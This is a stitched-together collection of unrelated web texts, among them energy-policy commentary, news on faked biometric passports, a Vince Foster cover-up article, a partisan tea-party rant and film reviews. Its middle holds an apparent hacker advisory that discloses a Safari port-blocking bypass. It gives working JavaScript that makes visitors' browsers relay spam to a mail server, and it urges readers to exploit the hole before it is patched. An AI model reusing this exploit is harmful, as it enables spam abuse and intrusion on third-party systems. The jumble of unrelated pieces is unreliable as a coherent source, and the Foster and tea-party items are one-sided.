Carbon has a molecular weight of 12 while carbon dioxide has a molecular weight of 44 .
Thus the gas to be transported and reinjected has considerably greater weight ( and vastly greater volume ) than the coal it was created from , making the energy requirements for transportation very high .
This means that the total amount of coal that needs to be burned ( considering the CO2 weight to be transported ) will need to be considerably higher with CCS than without -- so there will be more pollution to deal with , and coal supply is likely to run short sooner .
Commercial deployment in 8 to 10 year sounds like a pipe dream to me .
Maybe in 20 or 30 years , but even then , I wonder .
If the carbon dioxide escapes , it will form a low lying cloud and smother whoever gets in its way .
How many communities will want to be located near a CCS storage facility ?
Slide 16
On Slide 16 , Chu talks about small nuclear reactors , which might be used to replace an individual turbine ( coal or gas ) within an existing power generation plant .
This approach would keep costs low , partly because the units could be produced in quantity , and partly because they could just be substituted where transmission lines are already in place .
This is something in Obama 's budget request , not something for which funds have already been appropriated .
I can see several issues with these .
We still have no nuclear disposal site , so the many facilities with these new small reactors will be faced with dealing with nuclear disposal " on their own " .
Also , power plants which have in the past had very limited security issues will suddenly need to deal with the security of having a nuclear reactor on site .
There is also the issue of whether there will be adequate nuclear fuel available when the time comes for these units to need it .
Russian nuclear bomb material which has been down - blended and used as supply in recent years will be in smaller supply after 2013 .
Alternate uranium supplies ( nearly all imported ) may or may not ramp up , depending on such things as uranium price , oil price , and capital availability .
Slide 17
Slide 17 , and as we will see in a bit , Slide 18 , deal with the issue of how we can get around the problem of investments in new technologies not being profitable , because burning fossil fuels is cheaper .
In this slide , we see that Chu says " Market opportunities are structured by policy . "
Dr. Phil Sharp , a former member of congress , was another speaker in the plenary session .
With respect to this topic , he noted ( when he spoke later in the plenary session ) that the new energy sources would require $ 100s of billions of investment in the next few years , and would be a drag on the economy .
In Sharp 's view , " We can not subsidize our way out of this situation . "
Slide 18
In Slide 18 , Chu seems to be arguing that if Europe can make changes in its mix of energy technologies , the US can also .
I would just note that it is much easier to ramp up generation from renewables when the world economy is in a growth mode than when it is already declining , or at best , flat .
Putting a drag on the economy when it is in growth mode will likely put it in a lower growth mode .
Putting a drag on the economy when it is already declining is likely to cause worsening recession , and may even cause collapse .
So one is dealing with a very different situation .
Slide 20
Slide 20 shows
Chu 's sales pitch for cap and trade .
According to Chu , if it worked for acid rain ( and in fact came in below cost projections ) , it can work for carbon .
The catch is that with the acid rain cap and trade program , there was an easy technical solution to the sulfur dioxide emissions .
An electric power plant had the option of installing a scrubber , and thereby clean up its emissions , or it could buy pollution allowances .
The problem with carbon is that ( despite the CCS discussions ) , there really is n't any good way of cleaning up carbon emissions , other than through small increments from increased efficiency ( and even there , Jevon 's Paradox says that since the product will be cheaper , more can afford it , and demand will go up ) .
One can get the Chinese to do the heavy manufacturing , and import the finished products from them , but that does n't reduce the world 's emissions , just those of the US .
One can buy a certificate saying that a some trees will be planted because of the certificate , but there is a significant chance another plot of trees not too far away will be cut down instead .
Wind and solar can act to extend our natural gas supply , but do n't really substitute for oil .
Perhaps some of these issues can be dealt with , but I have yet to see evidence that this is the case .
So it seems to me that there is no comparability between the acid rain cap and trade program and a carbon cap and trade program .
Slide 22
Slide 22 looks to me to be a politically acceptable way of describing our short supply of oil .
" The cost of oil and other forms of energy will rise in the coming decades , " sounds better than , " There will be a shortage of oil and other forms of energy in the coming years . "
In the second bullet point , I think the point Chu is trying to make is , " We will live in a carbon constrained world . "
If Chu knows about our energy shortages , he can be sure of this statement , whether or not any climate legislation is passed .
With respect to " China , EU countries and others see economic opportunity and are moving aggressively , " there may be a small economic opportunity component ( especially for China selling wind and solar to the world ) , but even more there are other concerns -- perhaps shortages ahead , perhaps climate change , and perhaps just plain pollution from coal ( especially for China ) .
Slide 23
Slide 23 was Energy Secretary Chu 's final slide .
It is hard for me to see that what Chu is proposing will really solve our problems .
For one thing , there is really no solution to our liquid fuels problem .
What he is looking at is more natural gas production , and better ways of handling the carbon from coal , and more electricity from nuclear , and ways of saving electricity through more efficient appliances ( sorry , I skipped that slide ) .
While some offshore drilling is planned , it is likely to yield only a small amount of oil , and only after several years , so is not likely to be much of a solution to our liquid fuel problems .
The solutions which are proposed will take years , and will give us more natural gas and electricity .
Assuming they work , we will still need to convert our vehicles to natural gas or electric , at very significant cost .
These conversion costs will come in addition to all the cost of new electric generation .
None of this proposal plans for the reduced lifestyle we are likely to have ahead .
Instead ,
Chu is proposing that we attempt to continue Business as Usual , even though it is no longer possible .
I am afraid the train has already left the station for this approach .
London , England ( CNN ) --
In the name of improved security a hacker showed how a biometric passport issued in the name of long - dead rock ' n ' roll king Elvis Presley could be cleared through an automated passport scanning system being tested at an international airport .
Using a doctored passport at a self - serve passport machine , the hacker was cleared for travel after just a few seconds and a picture of the King himself appeared on the monitor 's display .
Adam Laurie and Jeroen Van Beek , who call themselves " ethical hackers , " say the exercise exposed how easy it is to fool a passport scanner with a fraudulent biometric chip .
The Presley test was carried out at Amsterdam 's Schiphol airport in September 2008 -- by Laurie and Van Beek -- to highlight potential security shortcomings .
Passports , and the ability to fake them , are back in the spotlight after the apparent use of false documents during the gang assassination of a Hamas militant in Dubai in January .
Van Beek said : " What we did for that chip is create passport content for Elvis Presley and put it on a chip and sign it with our own key for a non-existent country .
And a device that was used to read chips did n't check the country 's signatures . "
Fingerprint scans , eye scans and digital photographs are now frequently used with passports to check a traveler 's biometrics -- unique physical characteristics that can identify a specific individual
Biometric passports -- with data stored on embedded chip -- are now standard issue in Europe , the U.S. and a number of other countries .
Laurie and Van Beek use their knowledge of IT security and hacking to show that biometric passports remain vulnerable to fraud .
" I think [ fraud ] is 100 percent possible , " said Laurie .
" The passport bit is the more difficult .
You would have to buy one from a professional forger or some means , but adding the chip is something we could do ourselves using off the shelf equipment using $ 100 investment . "
The problem , in part , is that each country has its own security signature for verifying its own biometric passports .
While some share that information , many countries do not , making it easy to exploit the loopholes , said Laurie .
" I probably could n't produce a fake UK passport that would successfully cross into the UK because I 'm sure the UK is actually able to check its own signatures , " Laurie said .
" But I may be able to produce a passport from some other country and use it on an automated system to enter the UK and the UK would n't be able to check the signatures because they do n't have them . "
An international system coordinating the various security signatures is needed , said Van Beek .
" If you want to make the system more secure then all countries need to have access to a list of all certificates of all countries all over the world .
If that 's in place , if that list is used by all countries and all inspection systems , that might help to detect non-genuine documents and non-genuine chips , " said Van Beek .
" But if that system is not there , it 's really difficult to increase the security level with the technology that 's currently used .
So , implementing a central security system with all lists from around the world , that 's something that needs to be done before you can trust the system , " he added .
Most countries rely on a combination of automated passport scanning by computers and border control officers .
But Laurie and Van Beek fear an over - reliance on the automated scanning .
" If they [ the scanners ] are checking a facial image , they look at the picture of the person standing there .
They check it against the data stored on the chip and if they match and that person is n't on a stop list , then they let you through , " explained Laurie .
" In the current state , I think they 've actually made the borders weaker , not stronger . "
But Britain's Home Office maintains that its biometric passports are some of the most secure in the world .
" We remain confident that the British passport is one of the most secure documents of its kind -- fully meeting rigorous international standards , " said a Home Office spokesperson .
" Since 2006 biometric passports issued by the British government biometrically link an individual to their passport through their photograph contained in an electronic chip .
" Even if an individual 's photograph on the document is changed the photograph in the chip cannot be without border control officers becoming aware that the passport chip has been tampered with . "
But Laurie and Van Beek insist that confidence in technology could be misplaced , because biometric passports can be faked , with pictures and chips that match .

Lol , the PC elitism in here is both humourous and disgusting at the same time .
PC only gamers really do n't take not being the center of attention very well , do you .
I mean , worse than PS3 or Xbox fanboys .
Mayyyyybe not worse than Apple fanboys .
But pretty close . :)
A single article like this one and you get ' yeah , the console version sucks ' and ' of course , who would use a controller ' and ' the fanbase is more sophisticated / educated / better somehow ' .
I got news for ya .
1 . The console version is just as fun .
Care to tell me how the PC 's prettier graphics make it more fun ?
2. Lots of people prefer a controller to a KB/ M .
The amount of ' rabble rabble rabble there is only one way to play , using kb / m ' is a sign of ignorance .
As long as everyone in the game you 're playing is using the same control setup with the same peripheral , and it works , who the hell cares ?
Certainly not console - ers , since otherwise they'd be gaming on a PC .
Or if they do care , it can't be that much .
3 . Then the classic ' PC gamers are more mature and sophisticated ' , HA .
Scroll down .
Nuff said .
A single article like this , and you get all the smarmy jackalopes swarming out of the woodwork .
I 'm not saying that being able to rub something in console 's faces is n't justified after years of increased neglect from devs and gamers alike ( PC gaming is dying , etc ) , but the fact that its happening ( such comments ! ) also lends credence to the idea that PC gamers are immature jackasses , just like the console gamers they vilify .
You 're all the same .
Your game console just cost more and has about a million more features . :P
A Bitter Pill -- A School 's Drug Policy Sours One Teenager 's Experience with Glucose Tablets
Thirteen - year - old Eric
Carr did n't think much of it when two classmates saw him taking a glucose tablet and asked to try one .
Insulin - dependent since the age of nine , Eric figured glucose was harmless , something that simply kept his sugars from dropping .
Little did he realize that sharing the tablets would lead to a week - long suspension from Hollenbeck Middle School in St. Peters , Missouri and a permanent blemish on his school records .
A teacher passing in the hall saw Eric giving out the tablets and asked to see them .
He told the teacher they were sugar .
" She did n't know what they were , " says Eric , " so she took the glucose tablets to the nurse 's office . "
The next day Eric was called into the principal 's office and given a three - day suspension , plus another three days of in - school suspension .
The two classmates who took the glucose tablets were suspended for three days .
This all happened because of the Missouri Safe School Act , a law that prohibits children from sharing over - the - counter drugs .
Glucose , the school faculty had determined , was a drug .
But Eric Carr 's stepfather , Jim Armistead , was n't so sure .
He contacted Fred Friedberg of Can - Am Care Corporation , the distributor of the Dex4 glucose tablets which Eric had given to his classmates .
Armistead wanted to know if glucose was considered a drug .
" I told him that glucose is a type of sugar - not a drug , " says Friedberg .
" In fact , many school nurses request glucose tablets from us for their students with diabetes . "
Friedberg sent Armistead information on the glucose tablets , then put him in touch with the American Diabetes Association 's Advocacy Committee which investigates discrimination issues .
Eric 's parents hired a lawyer and asked Eric 's endocrinologist to write a letter to the school clarifying that glucose is a harmless substance .
In his letter , Myrtos Frangos , MD , wrote : " There is no ' drug ' contained in a glucose tablet .
Ingesting a glucose tablet could not cause harm to anyone any more than a cube of sugar could . "
Still , the school stood firm .
Its superintendent , Lee Brittenham , PhD , explained the Missouri Safe School Act absolutely prohibits children from sharing medication .
" I 'm not a medical person , but if you were to ask any parent of a child , they would not want something handed to them in school that looked like medicine , " he argued .
" For all we know it could be laced with LSD .
You have to take those possibilities into account . "
As a result , Eric was instructed to sign a disciplinary document admitting that he was guilty of passing out drugs .
" He felt like they thought he was a drug dealer , " says his stepfather .
The document was placed in Eric 's permanent file .
He stayed home for his three - day suspension , then spent the next three days of in - school suspension in an empty classroom biding his time .
He was willing to carry out the suspension time , but he and his parents wanted the confession document removed from his permanent file .
They argued the file could falsely brand their son as a drug dealer in the eyes of other school officials .
The school 's principal , Gary Lacey , assured Eric 's parents that this would never happen .
Two weeks later a school counselor called .
" She asked if we wanted Eric to be part of a group project to keep kids off of drugs , " says Armistead .
" She said she had chosen him because she saw that he had been suspended for distributing an over - the - counter substance and felt that made him a perfect candidate for the group . "
The Armisteads , angry that Eric had been wrongly identified as a child at risk for drug abuse , contacted Principal Lacey once again .
" I tried to explain to him again that glucose was nothing more than sugar , " remembers Armistead .
Realizing he was getting nowhere with the school principal , Armistead turned to the assistant superintendent , Dan Brown , PhD .
" He said that it was n't the substance that mattered ; it was the principle - he was passing out drugs . "
Armistead pointed out that many teachers at Hollenbeck Middle School pass out candy as a reward to the students .
" We 'll just have to agree to disagree , then , " responded Brown .
Frustrated , Armistead contacted the Missouri Affiliate of the American Diabetes Association .
" They sent me some paperwork on discrimination rights , but they said they did n't have the resources to help me pursue a case against the school . "
The family 's lawyer said it would cost at least $ 2,000 to take the case to court , more than the family wanted to spend .
Eight months later , the disciplinary record in Eric 's file remains .
And a frustrated Eric is convinced that the school acted in haste .
" I do n't think they ( the school faculty ) knew what they were doing .
Before they acted , they should 've figured things out . "
Eric 's parent 's are much less forgiving .
" Frankly , I 'm ticked off , " says Armistead .
" They made up their minds before they had the facts .
I had an endocrinologist and other experts contact them ; still they had no influence on their decision . "
Of all the school faculty contacted , only Superintendent Dr. Brittenham would speak with Diabetes Interview .
Brittenham stands by Hollenbeck Middle School 's decision and insists his school district provides faculty and nurses who are well versed in caring for children with diabetes .
So why then did n't they recognize a simple glucose tablet for what it was ?
Eric Carr and his family are still waiting for an answer .

Documents Reveal Judges ' Deliberations on a Death
By Hugh Turley
Vincent Foster , former president Bill Clinton 's deputy White House counsel , died nearly 18 years ago , and his death was ruled a suicide .
But recent research has revealed that the judges who had appointed the independent counsel investigating his death were worried about " be[ing ] charged as conspirators in the cover - up , " in the words of Judge John Butzner .
Butzner was part of a three - judge panel on the Special Division of the District of Columbia Circuit that had appointed Kenneth Starr to investigate several matters relating to the Clinton 's Whitewater land deal , an inquiry that grew to include Foster 's 1993 death .
Notes between the now - deceased Butzner and his colleagues Peter Fay and David Sentelle are part of the collection of Butzner 's papers at the University of Virginia 's law library .
They show discussion about whether to include the testimony of Whitewater grand jury witness Patrick Knowlton , who had been at Fort Marcy Park the day Foster 's body was found .
As a passerby , he testified that Foster 's Honda was not at the park at the time of death .
Foster therefore could not have driven to the park in his car as claimed by Starr .
Knowlton asked the judges to include additional evidence based on official records contradicting Starr 's report :
Other witnesses did not see Foster 's car , the gun found was not Foster 's , there was a bullet hole in Foster 's neck , crime scene photographs and X - rays had disappeared .
Knowlton provided evidence he was the victim of witness intimidation by Starr 's staff .
On Sept. 24 , 1997 , Judge Sentelle sent his colleagues Knowlton 's motion to include comments and factual information as an appendix to the report on Foster 's death .
Sentelle told them : " The question of what to do with his comments is not an easy one .
...
If I were forced to decide the question alone , it would be my inclination to deny the motion . "
Judge Fay disagreed with Sentelle . " [ Knowlton ] does comment on specific findings and conclusions in the report , " he argued .
" He contradicts specific factual matters and takes issue with the very basics of the report filed by the [ Independent Counsel ] . "
The following day Butzner concurred .
" I suspect if we deny the motion we will be charged as conspirators in the cover - up , " he wrote .
" I suggest we let the motion and the attachments speak for themselves . "
That afternoon , Sentelle faxed his colleagues a message that , after reviewing their memos , he had changed his mind and agreed to draft an order granting the motion .
So on Sept. 26 , the court ordered that Knowlton 's comments and evidence be included in Starr 's report .
On Sept. 29 , Starr filed a motion appealing the order .
It was denied the next day , marking the first time in history that an Independent Counsel was ordered to include in his report evidence of a cover - up by his own investigators .
After Starr 's motion was denied and before the report was made public , Knowlton and his attorney visited the Associated Press office to show the reporter on the case the evidence contradicting Starr that had been ordered part of the final report .
They were not prepared for his response .
" [ The reporter ] told us the story was already written and [ the cause of death ] was suicide , " Knowlton told the Hyattsville Life & Times .
" We did not believe the press could ignore the court - ordered attachment . "
Now , for 13 years , the American press has not reported on the Knowlton appendix , and the attachments did not " speak for themselves " as Butzner envisioned .
But the press has reported the latest news about Kenneth Starr -- he will become the president of Baylor University this June .
This article appeared originally in the April 2010 Hyattsville ( MD ) Life and Times .
All the documents described in the article , including the Knowlton appendix ordered included with Kenneth Starr ’s report over his strenuous objection — and the objection , itself — can be found here .
The complete Starr report on Foster ’s death , including the vital Knowlton appendix , is here .
The Washington Post , however , protecting Starr ’s reputation in a manner that the three judges , to their credit , refused to do , have what it claims to be the full Starr report here .
In an act worthy of Pravda in the old Soviet Union , The Post has censored out the Knowlton appendix .

g . o . a . t . s . e s . e . c . u . r . i . t . y g . a . p . i . n . g h . o . l . e . s e . x . p . o . s . e . d http://security.goatse.fr/
( 323 ) 306-4576 attention : due to technical limitations , this advisory cannot be displayed correctly .
to view with images and video , visit the following page : http://encyclopediadramatica.com/Safari_XPS_Attack warning : some of the content on this link may offend you and your employer .
We at the Goatse Security labs have been delving into an old ( but also new ) class of web exploits originally coined cross-protocol scripting , but now more commonly referred to as inter-protocol exploitation .
Goatse Security has a double feature for you , starting with a 0day vuln : * Safari browser port blocking bypassed by integer overflow and a technique that , as far as I know , has not been premiered before : * XHR ( XMLHttpRequest ) as a vector for mail merging or wordlist attacks in XPS / IPE attacks
We 're going to show you how these two methods combine like Voltron into a whole much larger than its parts .
At the end of this short advisory you will be able to take any Safari web browser and make it a spam drone , a wordlist - based logon cracker for networks , or a relay for payloads to arbitrary daemons .
You will be able to do all of this without passing any shellcode or alerting any IDS to compromise .
Let 's cover the bug .
First , I would like to give credit to my cat , Gary C. Berries , as the initial researcher to uncover this bug .
Without my cat 's assistance as an enterprise class keyboard - based integer fuzzer this vulnerability would have been left unearthed .
Apple is going to learn several lessons here , the most important of which is probably not to let an unsigned short pose as anything other than an unsigned short .
Open up a Safari browser on your favorite chode - sniffing operating system .
Go to a " banned " port like 25 and you 'll get an error : ___Not allowed to use restricted network port___ ( WebKitErrorDomain : 103 )
Add 65536 to 25 to make 65561 and revisit the site on this new port -- no such cockblocking .
You 're good to go .
You can now use the Safari web browser as a device to hit any port on any address with a cross- protocol scripting attack .
HOWTO video !
http://vimeo.com/10302434
List of Webkit - based browsers found to be affected : OS X Safari iPhone / iPod Safari iPad Safari ( confirmed with iPad Simulator in SDK 3.2 beta 4 w/ XCode 3.2.2 ) Arora iCab OmniWeb Stainless
The only Webkit - based browser found to not be vulnerable : Google Chrome For all Apple 's talk of " think different " the only one actually doing so in regards to browser security is Google .
XSS , XPS / IPE , all the traditional methods fail against Chrome .
Google , I do n't even care that you are the most ruthlessly evil corporation in existence anymore .
Your stuff just works .
You had me sold at functional reliability .
There was a time in my life that I had large concern about corporate ethics .
Now I know that all corporations are evil .
Some more than others .
The one who is evil and smart will only ruin you with malice , where the one that is evil and stupid can ruin you out of both malice and out of sheer incompetence .
To give this exploit a little of that " je ne sais quoi " , we need to come up with a good attack vector .
Now we 're going to show you how Apple did n't just unearth a decade - old vulnerability and make it viable again a la Microsoft , it actually becomes more viable to exploit in this new generation than it was at the time of its inception .
When cross-protocol scripting was born , Javascript was pretty young .
There was n't a whole lot you could do with it then -- any bits of Javascript now called AJAX would n't be a cross - browser standard until 2004 .
So I looked at this integer overflow and I thought to myself what exactly I 'd find this useful for .
The answers I came up with were : * Getting idiot Mac-using creative people at bulk mailing companies to click on links which spew SMTP envelopes at their internal mailserver , thereby utilizing someone else 's email reputation to send CPA offers of my own .
* Bruteforcing device passwords via a wordlist and then phoning home * Reflashing network devices with firmware more fun than the factory default * Relay exploit payloads to non-HTTP daemons on arbitrary TCP ports *
Get a Safari web browser to do pretty much anything on any TCP port and not have any current IDS / IPS in existence be any wiser for it .
We summarily implemented all of these things , but I 'm going to show you how to do the first one since the code is trivially altered to do many of the others .
Also because it is the most fun and easy way to monetize this particular vuln , and I 'm hoping other people will make use of it before Apple patches !
( The best part of our first cross- protocol scripting PoC release : http://encyclopediadramatica.com/Firefox_XPS_IRC_Attack was seeing how many other people used it to summarily ruin every IRC network that exists .
What can I say ?
I love being an enabler . )
What you 'll need : * A PoS web browser from Apple * An MTA that ignores synchronization and is error tolerant
For the latter you may be asking , what MTA ignores synchronization ?
Well , more than one of them do out of the box .
They generally cost five figs and are intended for the direct email marketing industry .
I 'd love to tell you which ones I got working but unfortunately I 'm under NDA with them .
Their software is really good and central to my business and I paid a metric ton of cash for it , so I would like to continue receiving updates and support and also not be sued .
I asked for permission to mention their name in a Goatse advisory but they were none too pleased with the idea .
So you will have to just make an educated guess .
There are only so many pieces of SMTP software that will cost you the price of a decent car .
Regardless , ignoring synchronization ain't exactly a bug , it is a feature .
This advisory is not about who writes a good SMTP server for sending bulk !
So , to initially send our first mail I tried a classic document.
getElementById and a parentNode.submit( ) , but found this particular vector for XPS did n't work in Safari .
So for the first wave of testing I used a multipart / form - data enctyped POST with a document.formname.submit .
PoC video here : http://vimeo.com/10383253
So now that I know that its possible to send an email , I 'll want to make a mass producing industrial line out of this bitch .
We 'll want a silent and deadly bit of javascript in an innocuous page which continually refreshes a child iframe when it is done sending its current batch of emails , whilst the child will scrape mailing list and potentially other merge data from a function referenced from the parent node in the DOM tree .
The parent frame is gonna look something like this : < iframe src= " / " id = " m9 " ></ iframe > < script > var i = 0 ; var emails ; var xhr = new XMLHttpRequest ( ) ; var url = " emails.php " xhr.open ( " GET " , url , true ) ; xhr.onreadystatechange = function ( ) { if ( xhr.ready State == 4 ) { emails = eval ( xhr.responseText ) ; window.setInterval(function ( ) { var m = document.getElementById('m9 ' ) ; m.src= " m9.html " ; } , 1000 ) ; } } ; xhr.send ( null ) ; function getEmails ( ) { var e = [ ] ; for ( var x=0 ; x < 10 ; x++ ) { e[x ] = emails [ i++] } return e ; } </ script >
While the child m9.html will look something like this : < form method = " POST " enctype=" multipart /form-data " action = " http://target.mailserver:65561/ " id =" weevil " > < textarea id =" cmd " name = " cmd " rows = " 4 " cols = " 70 " > </ textarea > < br />< input type=" submit " value= " Submit " > </ form > < script > email(parent.getEmails ( ) ) ; function email ( x ) { var cmd = document.getElementById('cmd ' ) ; cmd.value = "
EHLO security.goatse.fr
" ; for ( var i = 0 ; i < x.length ; i++) { cmd.value += " MAIL FROM : weev ( ) security goatse fr
" ; console.log ( x [ i ] ) ; cmd.value += " RCPT TO : " + x [ i ] + "

Subject : JIZZTAPO

88
RUINRUINRUINRUIN
OKAY THIS MAIL IS OVER NOW
LOL
.
" ; } cmd.value += " QUIT
" ; document.getElementById(' weevil').submit( ) ; } </ script >
So , there you have it .
XHR is practically like some sort of God - damned voodoo , and now that it 's out of the box with unblocked ports I hope ya'll have fun with it before patch time .
I know this particular advisory was a little tl ; dr but we 're tired of people saying that this is all according to the HTTP RFC and is n't a big deal or a vulnerability ( here 's lookin at you , Secunia ) .
If this is how web browsers are supposed to behave , all you security people have got a heap o trouble to look forward to .

Safari browser port blocking bypassed by integer overflow Gary Niger ( Mar 23 )
Gary Niger ( Mar 23 )
Bespoke software is expensive .
As we all well know , it is risky to build , technical debt can easily creep in , and you can easily end up with a maintenance nightmare .
And software developers , well – we all know they are hard to work with , they tend to have opinions about things , and did I mention , they are expensive ?
The argument has always been that with purchased software , you get an economy of scale because you share the software with others .
Of course , this works out well most of the time – nobody should ever be developing their own internal commodity software ( think operating systems , databases , and other “ utilities ” ) .
However , not all software is “ utility ” .
There is a continuum of types of software , going from something like Microsoft Windows or Linux on one end , which nobody in their right mind would write , and company specific applications of all kinds that have zero applicability outside of a given , well , “ Enterprise ” .
The software I am talking about in this post lies somewhere in the middle of these extremes .
Almost anyone who does work in corporate IT has probably encountered one of these systems .
The following traits commonly pop up :
It is oriented at a vertical market .
The number of customers is often measured in 10s or 100s .
The cost for purchase is usually measured with at least 6 figures in USD .
It usually requires significant customization – either by code , or by a byzantine set of configuration options .
It was almost certainly sold on a golf course , or in a steak house .
You usually need their own consultants to do a decent installation .
The company that sells the software has professional services revenues at or higher than the software license revenues .
It is my observation that software in this category almost always is loaded with technical debt .
Technical debt that you ca n’t refactor .
Technical debt that becomes a permanent fixture of the organization for many years to come .
Enterprise Software – especially software sold as “ Enterprise Software ” to non-technical decision makers , is more often than not , a boat - anchor that holds organizations back , adding negative value .
Why is this ?
Enterprise software is often sold on the basis of flexibility .
A common process , sadly , in the world of package selection , is to simply draw up a list of features , evaluate a set of vendors on the basis of desired features , and balance that against some license cost + implementation cost threshold .
Lip service is given to “ cost - of - ownership ” , but the incentives in place reward minimizing the perceived future costs .
What this process selects for is a combination of maximum flexibility , moderate license cost relative to a build ( but often high ) , and minimized estimates of implementation cost .
Even if one company bucks the trend , the competitive landscape always selects for things in this direction .
Why is that true ?
We do n’t assess the technical debt of enterprise software .
I have seen a lot of buy versus build analysis in my years as a technology consultant , and not once did I see something that assessed the internal quality of the solution .
Enterprise software is bought based on external features , not internal quality .
Nobody asks about cyclomatic complexity or afferent coupling on the golf course .
Does internal quality of purchased software matter ?
Absolutely .
In spades .
It is hardly uncommon for companies to start down a path of packaged software implementation , find some limitation , and then need to come to an agreement to customize the source code .
Rarely does anyone have the intent to take on source when the software is purchased , but frequently , it happens anyway when the big hairy implementation runs into difficulty .
But even if you never take possession of the source code , the ability for you to get any upgrades to the solution will be affected by the packaged software vendor ’s ability to add features .
If the internal quality is bad , it will affect the cost structure of the software going forward .
APIs around software that has bad internal quality tend to leak out that bad quality , making integration difficult and spreading around the code smells that are presumably supposed to be kept “ inside the black box ” .
What is the end result ?
Package implementations that end up costing far in excess of what it would have been to build a piece of custom software in the first place .
Lots of good money thrown after bad .
Even when the implementation works , massive maintenance costs going forward .
It gets worse though .
The cost of the last implementation often colors the expectations for what the replacement should cost , which tends to bias organizations towards replacing one behemoth nasty enterprise software package with something equally as bad .
It is , what the French like to call , a fine mess .
So what is the solution ?
We need to change how we buy enterprise software .
The tools we have for buy versus build analysis are deficient – as few models include a real , robust cost - of - ownership analysis that properly includes the effects of insufficient internal quality .
It is amazing that in this day and age , when lack of proper due diligence in package selection can cost an organization literally billions of dollars , that so little attention is paid to internal quality .
What would happen ?
There would be a renewed incentive to internal quality .
Much of today ’s mediocre software would suddenly look expensive – providing room for new solutions that are easier to work with , maintain , and provide more lasting business value .
More money could be allocated to strategic software that uniquely helps the company , providing more space for innovation .
In short , we would realize vastly more value out of our software investments than we do today .

This was a pretty good debate with Cenk Uygur of The Young Turks and former Libertarian vice presidential candidate , now tea bagger Wayne Allyn Root .
If you did n't watch it I posted this clown along with fellow wingnut Dana Loesch on Larry King talking about getting rid of Social Security .
I bet most of those tea party protesters who look like they are old enough to be on Social Security and are out there with them do n't know they want to take their evil Socialist entitlement program away .
Cenk tries time and again during this interview to get Root to admit that he 's just a corporate tool of Dick Armey 's and asks him why the tea partiers are n't out there protesting Wall Street .
Root pretends he does n't like what they 've done either but spends most of his time changing the subject rather than actually answering Cenk .
It would be nice to see these wingnuts challenged by our sorry excuse for a " main stream media " as well as Cenk did here .
They'd be marginalized in the manner they deserve to be rather than propped up as some sort of grass roots movement , which they 're not .
This tea party movement is one part Dick Armey and company fake astroturf protest , one part angry McCain and Palin soreloserman , one part abortion clinic protester , one part white nationalist militia movement / gun rights nuts , one part ClusterFox / Glenn Beck brain dead watcher , one part anti-immigration Lou Dobbs / Tom Tancredo fan , one part southern racist that is n't done fighting the Civil War yet and one part Ron Paul / Libertarian .
What could ever go wrong with that special blend of tea ?
And you can argue that what I described here is not all of them , but I think it would be very hard to make the case that most of the people out there protesting at these tea bag rallies do n't fall into one or more of those categories .
Fabrice Tourre is the trader at the centre of the Securities and Exchange Commission 's fraud investigation into investment bank Goldman Sachs .
He , along with the investment bank , faces accusations of making misleading statements in connection with the sale of complex financial products based on sub - prime mortgages .
Mr Tourre is appearing along with the bank 's chief executive Lloyd Blankfein in front of a US Senate investigation into the causes of the financial crisis .
In connection with the investigation , Goldman Sachs released private emails Mr Tourre sent in 2007 using his Goldman Sachs mail account .
The candid messages are likely to form a part of the SEC 's case .
Goldman Sachs and Mr Tourre deny the SEC 's charges .
The emails date from the first half of 2007 .
Fabrice Tourre has since relocated to London .

The clergy child - abuse scandal roiling the Roman Catholic church has n't always been front - page news , but , over the years , it 's been thoroughly recorded on film .
Here 's how five acclaimed documentaries or fact - based docudramas have deftly handled the explosive topic since 1992 :
1. Deliver Us From Evil ( 2006 )
Amy Berg 's " sometimes sickening but vitally relevant " documentary focuses on now - defrocked priest Oliver O'Grady , who admitted to molesting roughly 25 boys and girls in California from the late 1970s to 1991 .
After seven years in jail , he was deported to Ireland in 2000 .
The film 's " most disturbing element , " says Desson Thompson in The Washington Post , is Berg 's interview with O'Grady in Dublin ; the " remorseless child molester " is " ambling freely among schoolchildren as he recounts his patterns of abuse with almost cheery glee . "
Church official implicated : Cardinal Roger Mahony , Archbishop of Los Angeles
2. The Boys of St. Vincent ( 1992 ) [ WARNING : partial nudity ]
Dramatizing real - life sexual and physical abuses of boys at a Christian Brothers orphanage in Newfoundland , this film focuses on 10 - year - old orphan Kevin Reevey and Brother Peter Lavin ( Henry Czerny ) , the sadistic pedophile who heads the orphanage .
The " emotionally devastating " story is told with " a matter - of - factness that gives it the solid credibility of a documentary , " says Janet Maslin in The New York Times .
It 's all the more " shocking , " and powerful , says Jeannette Sloniowski at the Museum of Broadcast Communications , because it " asks the audience to understand Lavin , and even gives the audience his point of view as he molests Kevin . "
Church officials implicated : The Christian Brothers at Mount Cashel Orphanage and the Newfoundland diocese
3. Hand of God ( 2006 , shown on PBS 's Frontline in 2007 )
Exposing the effects of child - molestation on a family , filmmaker Joe Cultrera tells the story of his brother Paul 's investigation into the Boston archdiocese 's mishandling of his accused molester , Fr. Joseph Birmingham .
The sometimes " florid " film is a " stinging denunciation of the Catholic Church , " says New York Times TV critic Alessandra Stanley , but " it 's also a celebration of the family that survived the ordeal , " especially Paul 's parents , who " revered the church but loved their children more . "
Church official implicated : Bishop John McCormack of Manchester , NH ; Cardinal Bernard Law , former Archbishop of Boston
4. Sex Crimes of the Vatican ( 2006 )
This Irish documentary takes direct aim at Pope Benedict XVI , charging that he covered up scores of sexual abuse cases during his 20 years as Vatican doctrine enforcer under Pope John Paul II .
It further claims that a secret 1962 Vatican document , " Crimen Sollicitationis , " ordered bishops to enforce silence in sex abuse matters .
The BBC - produced documentary is narrated by advocate Colm O'Gorman , who was raped at age 14 by notorious Irish priest Sean Fortune .
Church officials implicated : Cardinal Joseph Ratzinger , now Pope Benedict XVI ; retired Bishop Brendan Comiskey of Fern , Ireland
5. Twist of Faith ( 2004 ) [ WARNING : graphic language ]
Toledo firefighter Tony Comes began actively dealing with his adolescent sexual abuse after he and his young family moved into a house that , coincidentally , was five doors down from the home of his alleged abuser , former priest Dennis Gray .
As Comes ' lawsuit against Gray drags on , an increasingly bitter Comes comes unglued , says Matthew Gilbert in The Boston Globe .
But this Academy - Award - nominated film " is about scars , not about erasing them . "
Much of the footage was shot by the Comes family themselves with camcorders supplied by filmmaker Kirby Dick .
Church official implicated : Bishop James Hoffman of Toledo ( d. 2003 )

FEARS are growing of a generation of young men lost to education after data yesterday showed boys are increasingly turning their backs on the schools system .
While girls remain more likely to continue in full - time education after the age of 16 , a report from Careers Wales found that boys are increasingly likely to leave the system altogether .
And though the majority of young people continue with their education once they reach the legal age at which they can leave school , a study found that there has been a slight fall in the percentage of young people expected to go from year 13 into higher education .
